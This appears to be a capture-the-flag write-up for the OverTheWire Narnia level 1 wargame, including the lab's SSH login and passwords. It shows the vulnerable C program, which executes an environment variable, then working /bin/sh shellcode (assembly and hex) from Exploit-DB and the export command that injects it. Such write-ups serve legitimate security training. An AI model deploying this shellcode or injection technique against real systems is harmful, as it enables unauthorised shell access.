# Narnia 0 - Narnia 1
    SSH  : ssh narnia1@narnia.labs.overthewire.org -p 2226
    Pass : WDcYUTG5ul
# Method For Solution
As done early we change the directory from home to /narnia/ directory . 
Then execute the narnia1 file

      Give me something to execute at the env-variable EGG

This is the output 

Now let's see the narnia1.c code :

#include <stdio.h>

```
int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```
Here, the code will execute anything we put in the EGG environment variable, we only need to find a shellcode and set the EGG variable. 
I used a random shellcode from the Exploit Database.

```
; https://www.exploit-db.com/exploits/44594
section .text
global _start

_start:
    xor ecx, ecx
    mul ecx
    push ecx
    mov edi, 0x978CD0D0
    mov esi, 0x91969DD0
    not edi
    not esi
    push edi
    push esi
    mov ebx, esp
    mov al, 0xb
    int 0x80
```
Here is the hex converted shell codec
     
     \x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80

Now 

     export EGG=`python -c 'print "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80"'`

using this export command we export the egg variable 

After this again execute the narnia1 file to gain the shell access for narnia 2 and gain the password

# Password : 
      nairiepecu
